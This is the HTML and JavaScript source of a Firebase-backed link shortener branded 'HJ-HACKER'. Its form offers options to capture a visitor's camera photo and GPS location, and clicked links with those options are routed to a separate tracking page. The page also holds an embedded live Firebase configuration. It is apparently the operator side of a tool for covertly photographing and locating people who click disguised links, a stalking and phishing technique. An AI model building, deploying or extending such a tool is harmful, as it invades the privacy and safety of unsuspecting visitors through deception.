<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HJ-HACKER | Link Shortner</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            max-width: 500px;
            width: 100%;
        }

        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
        }

        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 600;
        }

        input, select {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 14px;
            transition: all 0.3s;
        }

        input:focus, select:focus {
            outline: none;
            border-color: #667eea;
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 15px;
        }

        .checkbox-group input {
            width: auto;
        }

        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }

        button:hover {
            transform: translateY(-2px);
        }

        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .result {
            margin-top: 20px;
            padding: 15px;
            background: #f5f5f5;
            border-radius: 10px;
            display: none;
        }

        .result.show {
            display: block;
        }

        .error {
            background: #fee;
            color: #c33;
            padding: 10px;
            border-radius: 8px;
            margin-top: 10px;
            display: none;
        }

        .error.show {
            display: block;
        }

        .success {
            background: #efe;
            color: #3c3;
            padding: 10px;
            border-radius: 8px;
        }

        .short-url {
            color: #667eea;
            word-break: break-all;
            margin-top: 10px;
        }

        .copy-btn {
            margin-top: 10px;
            background: #28a745;
            padding: 8px;
            font-size: 14px;
        }

        .loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔗 HJ-HACKER Link Shortner</h1>
        <p class="subtitle">Create short links with Firebase</p>

        <form id="linkForm">
            <div class="form-group">
                <label>🔗 Long URL</label>
                <input type="url" id="longUrl" placeholder="https://example.com" required>
            </div>

            <div class="form-group">
                <label>🎨 Animation Style</label>
                <select id="animationStyle">
                    <option value="rgb">RGB Ring</option>
                    <option value="loading">Loading Bar</option>
                </select>
            </div>

            <div class="checkbox-group">
                <input type="checkbox" id="captureCamera">
                <label>📸 Capture Camera (Takes visitor's photo)</label>
            </div>

            <div class="checkbox-group">
                <input type="checkbox" id="captureLocation">
                <label>📍 Capture Location (Requests GPS coordinates)</label>
            </div>

            <div class="form-group">
                <label>⏰ Expiration Date (Optional)</label>
                <input type="datetime-local" id="expirationDate">
            </div>

            <button type="submit" id="submitBtn">✨ Create Short Link</button>
        </form>

        <div id="result" class="result"></div>
        <div id="error" class="error"></div>
    </div>

    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <script>
        // ============ YOUR FIREBASE CONFIG (UPDATED) ============
        const firebaseConfig = {
            apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
            authDomain: "hjh-tools.firebaseapp.com",
            databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com",
            projectId: "hjh-tools",
            storageBucket: "hjh-tools.firebasestorage.app",
            messagingSenderId: "643137472905",
            appId: "1:643137472905:web:814ca23a86fb084811b958",
            measurementId: "G-S7W2C789G2"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // ============ BASE64 ENCODE/DECODE FUNCTIONS ============
        function encodeForFirebase(text) {
            try {
                return btoa(encodeURIComponent(text)).replace(/=+$/, '');
            } catch (e) {
                console.error("Encode error:", e);
                return btoa(text).replace(/=+$/, '');
            }
        }

        function decodeFromFirebase(encoded) {
            try {
                return decodeURIComponent(atob(encoded));
            } catch (e) {
                console.error("Decode error:", e);
                return atob(encoded);
            }
        }

        // ============ GENERATE SHORT CODE ============
        function generateShortCode() {
            return Math.random().toString(36).substring(2, 8).toUpperCase();
        }

        // ============ SAVE TO FIREBASE ============
        async function saveToFirebase(domain, shortCode, data) {
            const encodedDomain = encodeForFirebase(domain);
            const path = `domains/${encodedDomain}/${shortCode}`;
            
            console.log("Saving to path:", path);
            console.log("Data:", data);
            
            try {
                await database.ref(path).set(data);
                console.log("Saved successfully!");
                return true;
            } catch (error) {
                console.error("Firebase save error:", error);
                throw error;
            }
        }

        // ============ CHECK IF SHORT CODE EXISTS ============
        async function isShortCodeUnique(domain, shortCode) {
            const encodedDomain = encodeForFirebase(domain);
            const path = `domains/${encodedDomain}/${shortCode}`;
            
            try {
                const snapshot = await database.ref(path).get();
                return !snapshot.exists();
            } catch (error) {
                console.error("Check error:", error);
                return true;
            }
        }

        // ============ GET UNIQUE SHORT CODE ============
        async function getUniqueShortCode(domain) {
            let shortCode;
            let isUnique = false;
            let attempts = 0;
            
            while (!isUnique && attempts < 10) {
                shortCode = generateShortCode();
                isUnique = await isShortCodeUnique(domain, shortCode);
                attempts++;
            }
            
            return shortCode;
        }

        // ============ FORM SUBMIT HANDLER ============
        document.getElementById('linkForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            // Hide previous results
            document.getElementById('result').classList.remove('show');
            document.getElementById('error').classList.remove('show');
            
            // Disable button and show loading
            const submitBtn = document.getElementById('submitBtn');
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<span class="loader"></span> Creating...';
            
            // Get form values
            const longUrl = document.getElementById('longUrl').value;
            const animationStyle = document.getElementById('animationStyle').value;
            const captureCamera = document.getElementById('captureCamera').checked;
            const captureLocation = document.getElementById('captureLocation').checked;
            const expirationDate = document.getElementById('expirationDate').value;
            
            // Validate URL
            if (!longUrl.startsWith('http://') && !longUrl.startsWith('https://')) {
                showError('Please enter a valid URL starting with http:// or https://');
                submitBtn.disabled = false;
                submitBtn.innerHTML = '✨ Create Short Link';
                return;
            }
            
            // Current domain
            const currentDomain = window.location.hostname;
            const baseUrl = `${window.location.protocol}//${currentDomain}`;
            
            try {
                // Test Firebase connection first
                console.log("Testing Firebase connection...");
                await database.ref('.info/connected').once('value');
                console.log("Firebase connected!");
                
                // Generate unique short code
                const shortCode = await getUniqueShortCode(currentDomain);
                
                if (!shortCode) {
                    throw new Error("Could not generate unique short code");
                }
                
                // Prepare data to save
                const linkData = {
                    longUrl: longUrl,
                    shortCode: shortCode,
                    animationStyle: animationStyle,
                    captureCamera: captureCamera,
                    captureLocation: captureLocation,
                    createdAt: Date.now(),
                    clicks: 0
                };
                
                // Add expiration if set
                if (expirationDate) {
                    linkData.expiresAt = new Date(expirationDate).getTime();
                }
                
                // Save to Firebase
                await saveToFirebase(currentDomain, shortCode, linkData);
                
                // Create short URL
                const shortUrl = `${baseUrl}/${shortCode}`;
                
                // Show success message
                showSuccess(shortUrl, linkData);
                
                // Reset form
                document.getElementById('linkForm').reset();
                
            } catch (error) {
                console.error("Error creating short link:", error);
                showError('Failed to create short link: ' + error.message);
            } finally {
                submitBtn.disabled = false;
                submitBtn.innerHTML = '✨ Create Short Link';
            }
        });
        
        // ============ SHOW SUCCESS ============
        function showSuccess(shortUrl, data) {
            const resultDiv = document.getElementById('result');
            resultDiv.innerHTML = `
                <div class="success">
                    ✅ Short link created successfully!
                </div>
                <div class="short-url">
                    <strong>Short URL:</strong><br>
                    <a href="${shortUrl}" target="_blank">${shortUrl}</a>
                </div>
                <button class="copy-btn" onclick="copyToClipboard('${shortUrl}')">📋 Copy URL</button>
                <div style="margin-top: 10px; font-size: 12px; color: #666;">
                    <strong>Settings:</strong><br>
                    • Animation: ${data.animationStyle === 'rgb' ? 'RGB Ring' : 'Loading Bar'}<br>
                    • Camera: ${data.captureCamera ? '✅ Enabled' : '❌ Disabled'}<br>
                    • Location: ${data.captureLocation ? '✅ Enabled' : '❌ Disabled'}<br>
                    ${data.expiresAt ? `• Expires: ${new Date(data.expiresAt).toLocaleString()}` : '• No expiration'}
                </div>
            `;
            resultDiv.classList.add('show');
        }
        
        // ============ SHOW ERROR ============
        function showError(message) {
            const errorDiv = document.getElementById('error');
            errorDiv.innerHTML = `❌ ${message}`;
            errorDiv.classList.add('show');
            
            setTimeout(() => {
                errorDiv.classList.remove('show');
            }, 5000);
        }
        
        // ============ COPY TO CLIPBOARD ============
        window.copyToClipboard = function(text) {
            navigator.clipboard.writeText(text).then(() => {
                showError('Copied to clipboard!');
                setTimeout(() => {
                    document.getElementById('error').classList.remove('show');
                }, 2000);
            });
        };
        
        // ============ REDIRECT LOGIC ============
        async function handleRedirect() {
            const path = window.location.pathname.substring(1);
            
            if (path && path.length > 0 && path !== 'index.html') {
                const currentDomain = window.location.hostname;
                const encodedDomain = encodeForFirebase(currentDomain);
                const fullPath = `domains/${encodedDomain}/${path}`;
                
                console.log("Looking for:", fullPath);
                
                try {
                    const snapshot = await database.ref(fullPath).get();
                    
                    if (snapshot.exists()) {
                        const data = snapshot.val();
                        
                        // Check expiration
                        if (data.expiresAt && data.expiresAt < Date.now()) {
                            document.body.innerHTML = '<div style="text-align:center;padding:50px"><h1>🔗 Link Expired</h1><p>This short link has expired.</p></div>';
                            return;
                        }
                        
                        // Increment click count
                        database.ref(fullPath).update({
                            clicks: (data.clicks || 0) + 1
                        });
                        
                        // Store tracking data
                        if (data.captureCamera || data.captureLocation) {
                            const trackingData = {
                                shortCode: path,
                                captureCamera: data.captureCamera,
                                captureLocation: data.captureLocation,
                                timestamp: Date.now()
                            };
                            sessionStorage.setItem('hj_tracking', JSON.stringify(trackingData));
                            sessionStorage.setItem('redirect_url', data.longUrl);
                            
                            // Show tracking page
                            window.location.href = '/tracking.html';
                        } else {
                            window.location.href = data.longUrl;
                        }
                    } else {
                        document.body.innerHTML = '<div style="text-align:center;padding:50px"><h1>🔗 Link Not Found</h1><p>The short link you are looking for does not exist.</p></div>';
                    }
                } catch (error) {
                    console.error("Redirect error:", error);
                    document.body.innerHTML = '<div style="text-align:center;padding:50px"><h1>⚠️ Error</h1><p>Something went wrong. Please try again.</p></div>';
                }
            }
        }
        
        // Run redirect logic if this is a shortlink page
        if (window.location.pathname !== '/' && window.location.pathname !== '/index.html') {
            handleRedirect();
        }
        
        // Test Firebase on page load
        window.addEventListener('load', () => {
            console.log("Firebase Config Loaded:", firebaseConfig);
            console.log("Firebase Initialized:", firebase.apps.length);
        });
    </script>
</body>
</html>
